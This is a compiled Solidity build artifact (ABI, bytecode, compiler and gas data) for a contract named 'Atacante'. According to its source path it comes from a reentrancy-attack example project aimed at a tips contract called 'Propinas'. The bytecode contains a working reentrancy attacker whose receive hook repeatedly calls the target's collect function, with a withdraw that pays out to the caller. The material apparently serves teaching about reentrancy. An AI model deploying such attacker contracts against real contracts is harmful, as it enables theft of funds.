{
    "contractName": "Atacante",
    "abi": [
        {
            "inputs": [
                {
                    "internalType": "address payable",
                    "name": "_propinas",
                    "type": "address"
                }
            ],
            "stateMutability": "payable",
            "type": "constructor"
        },
        {
            "inputs": [],
            "name": "collectTips",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "propinas",
            "outputs": [
                {
                    "internalType": "contract Propinas",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "stateMutability": "payable",
            "type": "receive"
        }
    ],
    "bytecode": "608060405260405161029c38038061029c8339818101604052602081101561002657600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610244806100586000396000f3fe6080604052600436106100385760003560e01c8063027279aa146101255780633ccfd60b146101565780636d9342fd1461016057610120565b36610120576000805460408051634dcb776760e11b815230600482015290516001600160a01b03909216803193929091639b96eece916024808301926020929190829003018186803b15801561008d57600080fd5b505afa1580156100a1573d6000803e3d6000fd5b505050506040513d60208110156100b757600080fd5b5051905080821061011c576000805460408051631b53398f60e21b815290516001600160a01b0390921692636d4ce63c9260048084019382900301818387803b15801561010357600080fd5b505af1158015610117573d6000803e3d6000fd5b505050505b5050005b600080fd5b34801561013157600080fd5b5061013a610175565b604080516001600160a01b039092168252519081900360200190f35b61015e610184565b005b34801561016c57600080fd5b5061015e6101b3565b6000546001600160a01b031681565b60405133904780156108fc02916000818181858888f193505050501580156101b0573d6000803e3d6000fd5b50565b6000805460408051631b53398f60e21b815290516001600160a01b0390921692636d4ce63c9260048084019382900301818387803b1580156101f457600080fd5b505af1158015610208573d6000803e3d6000fd5b5050505056fea26469706673582212204c972e50c97e78369fd3fee325f81a92b20014ddbfffc8cb2fcbeee83b1575ff64736f6c63430006040033",
    "sourcePath": "/home/loki/dev/blockchain/tandil/reentrancy-attack-example/contracts/Atacante.sol",
    "compiler": {
        "name": "solc",
        "version": "0.6.4+commit.1dca32f3"
    },
    "functionHashes": {
        "collectTips()": "6d9342fd",
        "propinas()": "027279aa",
        "withdraw()": "3ccfd60b"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "116000",
            "executionCost": "infinite",
            "totalCost": "infinite"
        },
        "external": {
            "collectTips()": "infinite",
            "propinas()": "1015",
            "withdraw()": "infinite"
        }
    }
}